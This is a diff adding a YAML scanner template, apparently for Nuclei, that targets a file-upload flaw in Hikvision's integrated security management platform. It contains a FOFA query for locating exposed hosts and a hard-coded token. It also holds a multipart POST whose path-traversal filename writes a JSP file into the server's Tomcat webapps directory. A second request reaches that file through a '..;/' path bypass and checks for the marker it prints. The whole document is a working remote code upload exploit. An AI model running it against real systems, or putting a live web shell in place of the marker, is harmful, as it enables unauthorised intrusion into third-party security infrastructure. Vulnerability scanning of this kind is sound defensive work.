@@ -1,0 +1,44 @@
+id: Hikvision-iSecure-Cente-uploadAllPackage-fileupload
+
+info:
+  name: 海康威视综合安防uploadAllPackage文件上传
+  author: god
+  severity: critical
+  description: 海康威视综合安防uploadAllPackage文件上传
+  metadata:
+    fofa-query: app="HIKVISION-综合安防管理平台"||title="综合安防管理平台"
+  tags: Hikvision,rce,fileupload
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /center_install/picUploadService/v1/uploadAllPackage/image HTTP/1.1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
+    Accept: */*
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Token: SElLIGlhL3NmaGNjaTY3WWxWK0Y6UzVCcjg1a2N1dENqVUNIOUM3SE1GamNkN2dnTE1BN1dGTDJldFE0UXFvbz0=
+    Content-Type: multipart/form-data; boundary=--------------------------553898708333958420021355
+    Content-Length: 233
+
+    ----------------------------553898708333958420021355
+    Content-Disposition: form-data; name="sendfile"; filename="../../../../components/tomcat85linux64.1/webapps/eportal/y4.js"
+    Content-Type: application/octet-stream
+
+    <% out.println(123456);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+    ----------------------------553898708333958420021355--
+  - |+
+    @timeout: 30s
+    GET /portal/ui/login/..;/..;/y4.js HTTP/1.1
+    Host: {{Hostname}}
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "123456")'  
+        condition: and
